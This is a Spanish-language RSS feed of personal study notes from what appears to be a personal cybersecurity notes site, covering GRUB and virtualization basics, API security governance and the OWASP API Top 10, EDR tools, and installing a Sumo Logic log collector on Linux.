<br>Virtual Switches: Componentes virtuales que permiten que las VMs se comuniquen entre sí y con el exterior. Pueden configurarse para emular distintos tipos de topologías de red.
<br>VLANs: Segmentación de redes virtuales para mejorar la seguridad y el rendimineot. Las VLANs permiten separar el tráfico de red de diferentes VMs incluso cuando comparten el mismo hardware físico.
<br>Performance Optimization<br>
<br>CPU Allocation: Distribución de núcleos de CPU físicos entre las VMs. Puede incluir técnicas de afinidad de CPU para mejorar el rendimiento al aseguriar que ciertas VMs usen CPUs específicas.
<br>NUMA (Non-Uniform Memory Access): Optimización que respeta la arquitectura física del host, minimizando las latencias al asegurar que las Vms usen memoria y CPUs localizados en el mismo nodo NUMA.
<br>I/O Optimization: Uso de controladores paravritualizados (Como Virtio en KVM) para mejorar el rendimineto de entrada/salida en VMs, reduciendo la sobrecarga de la virtualización.
<br><br><br>GRUB es un gestor de arranque (Bootloader) utilizando principalmente en sistemas operativos Unix-like, como Linux. Su función principal e cargar el sistema operativo en la memoria y transferirle el control durante el proceso de arranque del sistema.<br>
<br>GRUB Legacy: Era la versión original de GRUB, utilizada ampliamente antes de 2010.
<br>GRUB 2: La versión actual, que incluye ejoras significativas en cuanto a funcionalidad, modularidad y soporte para múltiples sistemas operativos.
<br>GRUB permite al usuario seleccionar entre múliples sistemas operativos instalados en el mismo sistema. Esto es útil en configuraciones de dual o multiple boot.<br>A su vez, también permite configurar opciones específicas para el arranque del ssitema operativo, como parámetros del kernel, modo de recuperación y otros. Soporta una amplia variedad de sistemas de archivos, lo que le permite leer los archivos de configuración y el kernel de diferentes tipos de particiones.<br>GRUB Config Files<br>
grub.cfg<br>
<br>Path: Generalmente en /boot/grub/grub.cfg.
<br>Contiene las configuraciones del menú de GRUB, incluyendo las entradas de menú para diferentes sistemas operativos y opciones de arranque.
<br>grub.d (Directory)<br>
<br>Path: /etc/grub.d/.
<br>Contiene scripts que generan las entradas de menú en grub.cfg. Cada script en este directorio corresponde a una entrada en el menú de GRUB.
<br>grubenv<br>
<br>Path: Generalmente en /boot/grub/grubenv.
<br>Un archivo de ambiente que almacena variables persistentes usadas por GRUB, como la entrada de menú predeterminada para el próximo arranque.
<br>GRUB Commands<br>
<br>update-grub: Genera el archivo grub.cfg a partir de los scripts en /etc/grub.d/ y la configuración en /etc/default/grub.
<br>grub-install: Instala GRUB en el dispositivo de arranqeu (MBR o partición específicada).
<br>grub-mkconfig: Similar a update-grub, genera el archivo de configuración GRUB.
<br>Commoun changes<br>
Algunos cambios relacionados al GRUB se pueden llevar a cabo editando lo scripts en /etc/grub.d o el archivo /etc/default/grub.<br>
<br>Para cambiar el sistem operativo predeterminado deberiamos editar la variable GRUB_DEFAULT encontrada en el directorio /etc/default/grub.
<br>Para cambiar el tiempo de espera del menú habría que modificar la variable GRUB_TIMEOUT en el directorio mencionado anteriormente.
<br>De igual manera, para añadir parámetros del kernel deberiamos modificar la línea GRUB_CMDLINE_LINUX_DEFAULT.
<br>El GRUB es capaz de trabajar tanto con MBR (Master Boot Record) como con GPT (GUID Partition Table). Estas tablas de particiones organizan la disposición de particiones en el disco duro.<br>
A su vez, el bootloader GRUB puede manejar varios sistemas de archivos como EXT4, FAT32 y NTFS. Tanto si utilizamos configuraciones de Dual Boots o Multiple Boots, así como si unicamente contamos con un único sistema operativo basado en Linux, el GRUB o nos permitira seleccionar entre múltiples sistemas operativos instalados en el mismo sistema, por ejemplo un Debian y Windows (Si fuera el caso) como podría encargarse únicamente de cargar el sistema operativo instalado, así como mostrar una pantalla inicial que permite seleccionar opciones avanzadas, como modos de recuperación o configuración del firmware BIOS (Basic Input/Output System) UEFI (Unified Extensible Firmware Interface).]]></description><link>https://dobliuw.com/notes/3.-system/operative-systems/operative-systems-basics.html</link><guid isPermaLink="false">Notes/3. System/Operative Systems/Operative Systems Basics.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 25 Jul 2024 14:19:17 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/mbr_excalidraw_examples.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/mbr_excalidraw_examples.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[API]]></title><description><![CDATA[ 
 <br><br> Una API es una pieza de código que permite a diferentes aplicaciones comunicarse entre si y compartir información y funcionalidades. Una API es un intermediario entre dos sistemas, que permite que una aplicación se comunique con otra y pida datos o acciones específicas.<br>
En este último tiempo las API se han convertido en el principal vector de ataque de los atacantes, además el 83% de todo el tráfico de intener es desde APIs. Es decir que las APIs presentan un  elemento crítico en el panorama de la seguridad de una organización, es fundamental abordar la seguridad e las API de manera proactiva  yconstante para proteger los datos, sistemas y servicios. La comprensión de los riesgos asociados, la implementeación de pŕacticas de seguridad soólidas y la monitorazación constante son elementos clave para garantizar la seguridad de las API.<br><img alt="cybersecurity_landscape.png" src="https://dobliuw.com/lib/media/cybersecurity_landscape.png"><br>
<img alt="apis_tools_and_recommendations.png" src="https://dobliuw.com/lib/media/apis_tools_and_recommendations.png"><br>]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/blueteam/api-sec/api-(application-programming-interfaces).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/BlueTeam/API Sec/API - (Application Programming Interfaces).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 10 Jul 2024 15:11:26 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/cybersecurity_landscape.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/cybersecurity_landscape.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Governance]]></title><description><![CDATA[ 
 <br><br>La "gobernanza" (Governance) se refiere a la gestión y control de las APIs para garantizar que cumplan con los requisitos de seguridad y políticas establecidas por una organización. Esto implcica establecer procesos, políticas y procedimientos que ayuden a administrar y supervisar de manera efectiva todas las actividades relacionadas con las APIS.<br>Existen dos componentes para llevara cabo la governance. Por un lado la conciencia (Awareness) y por otro los procesos y la política.<br><img alt="governance_benefits_apisec.png" src="https://dobliuw.com/lib/media/governance_benefits_apisec.png"><br>
Los beneficios de Governance consisten en establecer chorencia. Se trata de coherencia en cómo se desarrollan lasAPi, cómo se implementa, cómo se prueban, etc. Establecer expectativas para el equipo de ingeniería, ¿Qué se re quiere?, ¿Cuáles son esos requisitos de documentación y políticas de autenticación, control de versiones?, etc.<br><br><br>
<br>

**Estandarizar y hacer cumplir el proceso de implementación de APIs
<br>


<br>


<br>

Documentación de la API mandatoria
<br>


<br>

Crear estándares de desarrollo de APIs
<br>


<br><br>Identificar: APIs, datos, paths de acceso (Amenzas potenciales).<br>
Evaluar: Vulnerabilidades, fallas lógicas, control de acceso, riesgos de terceras partes.<br>
Probabilidad: Examinar la probabilidad de un ataque.<br>
Impacto: Entender los daños, las perdidas y consecuencias de un potencial ataque.<br>
Mitigación: Desarrollar un plan para abordar el riesgo.<br><br>Swagger, conocida como OpenAPI Specification es una herramienta y una especificación qeu se utiliza en el contexto de las APIs para describir, documentar y definir el comportamiento de una API de manera uniforme y estandarizada.<br>
Esto es super importante en el pilar de Governance ya que nos brinda múltiples ventajas de cara a la seguridad.<br>
<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br><br>
<br>


<br>


<br>


<br>


<br>


<br>

Ejemplo de Guía de diseño:
<br><img alt="desing_guide_example.png" src="https://dobliuw.com/lib/media/desing_guide_example.png"><br><br><br>El testing es la seguridad de las APIs se refiere a la práctica de evaluar y analizar una API específica en busca de vulnerabilidades, debilidades de seguridad y psoibles probelmas que puedan ser explotados por atacntes maliciosos. Estas pruebas se realizan para garantizar que la API sea robusta y resistente a ataques y cumpla con los estándares de seguridad establecidos. <br>Este pilar es fundamental para la seguridad de las APIs, por lo que es importante saber como realizar el <a data-href="APIs abuse" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/api-abuse/explotation/apis-abuse.html" class="internal-link" target="_self" rel="noopener nofollow">APIs abuse</a>.<br><img alt="api_testing.png" src="https://dobliuw.com/lib/media/api_testing.png"><br><br><br>
<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br><br>
<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br><br>
<br>


<br>


<br>


<br>


<br><br><br>El Monitoring en la seguridad de las APIs se refiere al proceso de supervisar y analizar continuamente el tráfico y el comportamiento de una APi con el fin de identificar posibiles amenazas, anomalías y vulnerabilidades de seguridad en tiempo real o de manera proactiva. La monitorización  de seguridad de las APIs es esencial para detectar y responder a incidentes de seugirdad de manera oportuna y garantizar que la APi funcione de manera segura y eficiente. <br><img alt="monitoring.png" src="https://dobliuw.com/lib/media/monitoring.png"><br>
Esta fase, este pilar se relaciona a entender cómo se desempeñan y operan las APIs en producción. Una de las partes, Runtime Protection (Protección en tiempos de ejecución) hace referencia a protecciones activas en la API, esto incluye la aplicación de políticas, la exigencia de autenticación de los usuarios para acceder a los endpoints y el filtrado de tráfico. Este tipo de filtrado, por región, por IP, etc. puede ser una protección en tiempo real que podamos implementar.<br>
Por otro lado, Threat Detection (Detección de amenzas) refiere a ¿Como analizamos el tráfico apara buscar cosas como transacciones fraudulentas, tráfico fraudulento y ataques distrubuidos provenientes de muchas fuentes diferentes que apunta a recursos similares? ¿Se desea recibir alertas sobre esto y asegurarse de que se está controlando adecuadamente?. A su vez habilitar la respuesta a inicidentes, es decir, caputar el tráfico, registrar todo, colocarlo en un recursos para posteriormente volver sobre los pasos para comprender qué sucedió, que se intento realizar, etc.<br>
Por último, sin duda será necesario Control Validation (Validar los controles), para asegurar que todos los controles que se han implementado en el gateway, firewalls y en la aplicación funcionan según lo establecido y esperado. <br><img alt="api_discovery.png" src="https://dobliuw.com/lib/media/api_discovery.png"><br>
De igual manera, es importante tener en cuenta que existen múltiples limitaciones sobre la monitorización, por lo que hay que tener especial cuidado en esta fase ya que podría incluso generar latencia en los servidores.<br><img alt="limitations_of_monitoring.png" src="https://dobliuw.com/lib/media/limitations_of_monitoring.png">]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/blueteam/api-sec/los-3-pilares-(api-sec).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/BlueTeam/API Sec/Los 3 pilares - (API Sec).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 10 Jul 2024 15:11:54 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/governance_benefits_apisec.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/governance_benefits_apisec.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Conclusión]]></title><description><![CDATA[ 
 <br><br>Como se puede ver en <a data-href="Los 3 pilares - (API Sec)" href="https://dobliuw.com/notes/4.-cybersecurity/blueteam/api-sec/los-3-pilares-(api-sec).html" class="internal-link" target="_self" rel="noopener nofollow">Los 3 pilares - (API Sec)</a>, es muy imporante hacer uso de Governance, es necesario tomarse el tiempo para definir las políticas, los estándares, los procesos, para asegurarse de que ningna API entre en funcionamiento sin pasar por el proceso adecuado y sin pasar todas las puertas de docuemntación, pruebas, seguridad y validación. Un gateway es excelente para hacer cumplir esto y asegurar se de que todas las API administren, imlemente y operen de manera consistente.<br>
Por otro lado, implementar un programa de Testing para qeu cada endpoint se apurebe en todos los vectores de ataque que exista. Buscará eejcutar todas als combinaciones de pruebase en cada objeto de datos, tipo de usuario, gfunción y método, y crear una cobertra completa. Obviamente esto requiere generar miles de escenarios de ataque para probar la respuesta "bajo presión" de la API en estos. La única manera de lograrlo es mediante la automatización y las pruebas continuas. Como bien sabemos es verdad que mayormente las APIs no cambian, es decir los endpoints suelen ser siempre iguales, pero no esta de más testear frecuentemente la respuesta y comportamiento de los mismos por posibles cambios en el código, infraestructura.<br>
Por último, monitoring, desarrollar un conjunto de métricas para seguir el progreso, cuántas vulnerabilidades se encuentra, con qué rapidez se mitigan, etc.<br><br>Teniendo en cuenta una vez más <a data-href="Los 3 pilares - (API Sec)" href="https://dobliuw.com/notes/4.-cybersecurity/blueteam/api-sec/los-3-pilares-(api-sec).html" class="internal-link" target="_self" rel="noopener nofollow">Los 3 pilares - (API Sec)</a>....<br>
<br>


<br>


<br>


<br><br>
<br>


<br>


<br><br>
<br>


<br>


<br>


<br><br>
<br>


<br>


<br>


<br><br>
<br>


<br>


<br>


<br><br>
<br>


<br><br>
<br>


<br><br>
<br>


<br><br>
<br>


<br><br>
<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/blueteam/api-sec/mejores-prácticas.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/BlueTeam/API Sec/Mejores prácticas.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 10 Jul 2024 15:11:47 GMT</pubDate></item><item><title><![CDATA[OWASP]]></title><description><![CDATA[ 
 <br><br>OWASP es un proyecto de código abierto dedicado a determinar y combatir las causas que hacen que el software sea inseguro, esta organización sin fines de lucro se dedica a la seguridad de las aplicaciones web. <br><br><br><br>Las API tienden a exponer endpoints que manejan idenficiadores de objetos, creando una amplia superfice de ataque para problemas de Object Level Access Control. Se deben considerar comprobaciones de  la autorización a nivel de objeto en cada función que accede a una fuente de datos utilizando un ID del usuario.<br><br>Manipulando IDs para impersonar a otros usuarios o el acceso a los datos. <br><br>
<br>


<br><br>
<br>


<br><br>
<br>


<br>


<br>


<br><br><br>Los mecanismos de autenticación a menudo se implementa incorrectamente, lo que permite a los atacantes comprometere tokens de auteticación o explotar fallas e nla implementación para asumir temporal o permanentemente las identidades de otros usuarios. Comprometer la capacidadd e un sistema para identificar al cliente/usario compromete la seguridad de la API en general.<br><br>Una devil o pobre autenticación.<br><br>
<br>


<br>


<br>


<br>


<br>


<br>


<br><br>
<br>


<br><br>
<br>


<br><br><br>Esta categoría combina la vulnerabilidad <a data-tooltip-position="top" aria-label="https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/" rel="noopener nofollow" class="external-link" href="https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/" target="_blank">Excessive Data Exposure (API3:2019)</a> y la vulnerabilidad <a data-tooltip-position="top" aria-label="https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/" rel="noopener nofollow" class="external-link" href="https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/" target="_blank">Mass Asignment (API6:2019)</a>, centrándose en la causa pirncipal: La falta de validación de autorización o su implementación incorrecta a nivel de propiedad del objeto, esto conduce a la exposición o manipulación de información por parte de partes no autorizadas.<br><br>Explotando endpoints leyendo o/y modificando los valores de los objetos.<br><br>
<br>


<br>


<br><br>
<br>


<br><br>
<br>


<br>


<br><br><br>Satisfacer las solicitudes de API requiere recursos como ancho de banda de red, CPU, memoria y almacenamiento. Otros recursos, como correos electrónicos/SMS/llamadas telefónicas o validación biométrica, están disponibles a través de integraciones de API proporcionadas por proveedores de servicios y se pagan por solicitud. Los ataques exitosos pueden llevar a una Denegación de Servicio o a un aumento en los costos operativos.<br><br>La falta de recursos o velocidad limitada.<br><br>
<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br><br>
<br>


<br>


<br><br>
<br>


<br><br><br>Las políticas de control de acceso complejas con diferentes jerarquías, grupos y roles, y una separación poco clara entre funciones administrativas y regulares, tienden a generar fallas en la autorización. Al explotar estos problemas, los atacantes pueden acceder a los recursos de otros usuarios y/o funciones administrativas.<br><br>Usando funcionalidades de la API para modificar (CREATE, UPDATE, DELETE) recursos de otro usuario o cambiando metodos pasivos (GET) por activos (PUT, DELETE). También puede ser usada para escalar privilegios o <br><br>
<br>


<br>


<br>


<br><br>
<br>


<br>


<br><br>
<br>


<br>


<br><br><br>Las APIs vulnerables a este riesgo exponen un flujo de negocio, como comprar un boleto o publicar un comentario, sin tener en cuenta cómo la funcionalidad podría perjudicar al negocio si se utiliza de manera excesiva de manera automatizada. Esto no necesariamente se debe a errores de implementación.<br><br>Abusando de un flujo de trabajo empresarial legítimo mediante el uso excesivo y automatizado, limitando el tráfico (Los captchas no siempre son efectivos contra el tráfico fraudulento), rotando IPs rapidamente para evitar detecciones, errores lógicos en la aplicación.<br><br>
<br>


<br>


<br><br>
<br>


<br><br>
<br>


<br>


<br>


<br><br><br>Las fallas de <a data-href="SSRF - (Server-Side Request Forgery)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/ssrf/ssrf-(server-side-request-forgery).html" class="internal-link" target="_self" rel="noopener nofollow">SSRF - (Server-Side Request Forgery)</a> pueden ocurrir cuando una API está obteniendo un recurso remoto sin validar el URI proporcionado por el usuario. Esto permite a un atacante obligar a la aplicación a enviar una solicitud manipulada a un destino inesperado, incluso cuando está protegido por un firewall o una VPN.<br><br>Explotando inputs de URLS para realizar peticiones a servers 3ros maliciosos.<br><br>
<br>


<br>


<br>


<br><br>
<br>


<br>


<br><br>
<br>


<br>


<br>


<br><br><br>Las APIs y los sistemas que las respaldan suelen tener configuraciones complejas destinadas a hacer que las APIs sean más personalizables. Los ingenieros de software y DevOps pueden pasar por alto estas configuraciones o no seguir las mejores prácticas de seguridad cuando se trata de la configuración, lo que abre la puerta a diferentes tipos de ataques.<br><br>Falta de protección contra servicios innecesarios, uso de bots para ecaneos, detecciones y explotaciones de configuraciones erróneas.<br><br>
<br>


<br>


<br>


<br>


<br>


<br><br>
<br>


<br>


<br><br>
<br>


<br>


<br>


<br><br><br>Las APIs tienden a exponer más puntos finales que las aplicaciones web tradicionales, lo que hace que la documentación adecuada y actualizada sea muy importante. Un inventario adecuado de hosts y versiones de API implementadas también es importante para mitigar problemas como versiones de API obsoletas y puntos finales de depuración expuestos.<br><br>Accediendo no autorizadamenta a APIs viejas, que ya no estan actualizadas o a través de terceros confiables.<br><br>
<br>


<br>


<br>


<br>


<br>


<br>


<br><br>
<br>


<br>


<br><br>
<br>


<br>


<br>


<br><br><br>Los desarrolladores tienden a confiar en los datos recibidos de APIs de terceros más que en la entrada de usuarios, por lo que tienden a adoptar estándares de seguridad más débiles. Para comprometer APIs, los atacantes se centran en servicios de terceros integrados en lugar de intentar comprometer directamente la API objetivo.<br><br>Mediante el uso de APIs de terceros que generalmente son confiables, si se explotan estas apies de terceros pueden usarse para atacar APIs que dependen de estas.<br><br>
<br>


<br>


<br><br>
<br>


<br>


<br>


<br><br>
<br>


<br>


<br>


<br>


]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/blueteam/api-sec/owasp-top-10-api.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/BlueTeam/API Sec/OWASP Top 10 API.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 10 Jul 2024 15:12:59 GMT</pubDate></item><item><title><![CDATA[Falcon CrowdStrike]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:blue" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#blue</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:blue" class="tag" target="_blank" rel="noopener nofollow">#blue</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a>
<br><br><br>En este contexto, un endpoint es cualquier dispoisitivo informático que esté conectado a una red.<br><br>El Endpoint Detection and Response, conocido como EDR, es una herramienta de ciberseguridad que proporciona monitorización y análisis continuo del endpoint y la red. Los EDRs son más efectivos que los nativirus en la detección de malware desconocido puesto que utilzia una serie de técnicas novedosas, como:<br>
<br>Machine learning y la analítica.
<br>Sandboxing.
<br>Alertas generados por sistemas externos (IoC o Indicators of Compromise), categorización de los incidentes para actuar sobre los más críticos con rapidez.
<br>Investrigación de los incidentes desde el punto de vista histórico: se rastrea el origen y evolución del malware para tomar medidas preventivas de cara a incidentes futuros.
<br>Herramientas de remediación para eliminar los ficheros infectados, poner en cuarentena y volver al estado anterioro a la infección.
<br><br><br>Falcon es una plataforma de seguridad desarrollada por CrowdStrike, una empresa de ciberseguridad líder en el mercado. Falcon se enfoca en la protección de Endpoints y en la detección y respuesta de amenazas en tiempo real.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/blueteam/defensive-tools/falcon-crowdstrike/falcon-crowdstrike.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/BlueTeam/Defensive Tools/Falcon CrowdStrike/Falcon CrowdStrike.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 26 Feb 2024 20:42:10 GMT</pubDate></item><item><title><![CDATA[Creating my first collector]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:blue" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#blue</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:blue" class="tag" target="_blank" rel="noopener nofollow">#blue</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a>
<br><br><br>Como vimos anteriormente en <a data-href="2. Collectors, Sources &amp; Metadata" href="https://dobliuw.com/notes/4.-cybersecurity/blueteam/defensive-tools/sumo-logic/2.-collectors,-sources-&amp;-metadata.html" class="internal-link" target="_self" rel="noopener nofollow">2. Collectors, Sources &amp; Metadata</a>, los collectors son pequeños softwares que permite hacer uso de un source para recopilar información almanecada en sistemas, en este caso usaremos Linux, por lo que habría que descargar el collector desde la aplicación de Sumo Logic, el cual es un script en bash.<br>chmod +x {collector_downloaded}

sudo ./{collector_downloaded} -q -Vsumo.token_and_url={installationToken}
Copy<br>Importante tener en cuenta que el {installationToken} se crea también desde la aplicación de Sumo Logic en el apartado de tokens.<br>
Este comando para instalar el collector fue sacado de la <a data-tooltip-position="top" aria-label="https://help.sumologic.com/docs/send-data/installed-collectors/linux/#install-using-the-command-line-installer" rel="noopener nofollow" class="external-link" href="https://help.sumologic.com/docs/send-data/installed-collectors/linux/#install-using-the-command-line-installer" target="_blank">documentación de sumo (Install Collector for Linux)</a> en donde nos brinda una guia de installación mediante línea de comandos, interfaz gráfica, haciendo uso de token, con ID y access key, etc.<br>
Cabe destacar que el parametro -Vsources=&lt;absolute_filepath&gt; que nos indica que podemos agragar es perteneciente al source que utilizara el collector, el cual puede ser creado desde la página de Sumo Logic o ser obtenido (Este será un JSON) y agregado haciendo uso de este parametro. En caso de dudas podemos visitar la <a data-tooltip-position="top" aria-label="https://help.sumologic.com/docs/send-data/use-json-configure-sources/building-source-json-configuration-file/" rel="noopener nofollow" class="external-link" href="https://help.sumologic.com/docs/send-data/use-json-configure-sources/building-source-json-configuration-file/" target="_blank">documentación de sumo (Building the Source JSON Configuration file)</a> una vez más. <br>Una vez ejecutado el comando anterior, en caso de que hayamos agregado la flag -Vsources={path_to_source_JSON} lo que estaremos haciendo es adicionalmente iniciar la instalación del collector con el source ya asignado, en caso de no haberla agregado de igual manera estaremos dand comienzo a la instalación, la cual creara el collector en la ruta /opt/SumoCollector/collector, el cual podremos ejecutar el panel de ayuda para validar las opciones que posee. <br>/opt/SumoCollector/collecotr --help 
Copy<br>A su vez, una vez instalado el mismo, en nuestro panel de sumo collector podremos ver nuestro collector activo filtrando por Installed Collectors, en caso de haber indicado el source en la instalación podremos comenzar a ver logs y registros en caso de que los haya en el path indicado en el source.<br>
En caso de que no hayamos instalado el collecor indicando un source en formato JSON, podremos una vez visualizado el collector en nuestro panel de Sumo Logic, selesccionar la opción Add Source en donde podremos indicarle un nombre entre otras configuraciones así como también aclarar el path de nuestro sistema que queremos que monitoree, por ejemplo /var/log/apache2/*.log. En caso de crear un collector con un source con el path mencionado, este vinculara todos los logs de los archivos access.log y error.log de apache2 permitiendonos filtrar con querys de Sumo Logic en nuestro panel.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/blueteam/defensive-tools/sumo-logic/create-a-collector-(linux)/creating-my-first-collector.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/BlueTeam/Defensive Tools/Sumo Logic/Create a collector (Linux)/Creating my first collector.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:29 GMT</pubDate></item><item><title><![CDATA[1. Sumo Logic & Estrategía de Recolección de datos]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:blue" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#blue</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:blue" class="tag" target="_blank" rel="noopener nofollow">#blue</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a>
<br><br><br><a data-tooltip-position="top" aria-label="https://www.sumologic.com/" rel="noopener nofollow" class="external-link" href="https://www.sumologic.com/" target="_blank">Sumo Logic</a> es una empresa de análisis de datos de máquinas basadas en la nube que se centra en la seguridad, las operaciones y los casos de uso de BI. Proporciona servicios de análisis y gestión de registros que utilizan macrodatos generados por máquinas.<br><br><br>Sumo Logic es una solución escalable y altamente flexible, provee soluciones que funcionan para las organizaciones de todo tipo. La recolección de logs es manegada por los denominados Collectors.<br>
Los collectors son aplicaciones pequeñas que capturan y envían a Sumo Logic la captura de logs desde las aplicaciones de la empresa como servicios http, Amazon Web Services (AWS), etc.<br>
Así mismo, existen tres tipos de estrategias de recolección de datos las cuales nos permiten hacerlo de maneras diferentes.<br>
<br>


<br>


<br>


<br><br><br>
<br>

Este modo de recolectar datos es perfecto para clientes con una gran cantidad de servidores similares, que utilizan orchestration o automatización, principalmente registros de aplicaciones y sistemas operativos.
<br>Las fuentes de las cuales se puede extraer este tipo de información son:<br>
<br>


<br>


<br>


<br>


<br>


<br>Este metodo trae consigo una seria de ventajas y "desventajas", por ejempo si bien es verdad que no requiere harware adicional, nos da acceso directo a los logs y nos permite realizar automatización (Chef/Puppet/Scripting), también es verdad que requiere acceso a internet saliente, lo cual puede ocacionar problemas en reglas de detección o firewalls, así como también que utiliza los recursos del propio objetivo.<br>
<br>

Este modo de recolectar datos es perfecto para clientes con infraestrcutura en la nube, además mayormente las fuentes de las cuales se extrae la información suele ser solo una parte de toda la estrategia de recolleción de datos.
<br>Las fuentes de las cuales se puede extraer este tipo de información son:<br>
<br>


<br>


<br>

En este caso nos encontramos con una ventaja la cual es que no requiere instalación de software.

<br>

Este modo de recolectar datos es perfecto para clientes con entornos de Windows, que tengan una infraestructura de login (Syslog/Logstash) o centros de dato local.

<br>Las fuentes de las cuales se puede extraer este tipo de información son:<br>
<br>


<br>


<br>

Es importante que si bien este tipo de recolección de datos trae beneficios como no tener acceso a internet saliente, el aprovechamiento de la infraestructura y la no instalación de software en máquinas de producción, es importante tener en cuenta que trae consigo una seríe de "desventajas" las cuales son la escala que brinda, el hardware dedicado que se necesita, así como la complejidad (Failover, reglas de syslog)
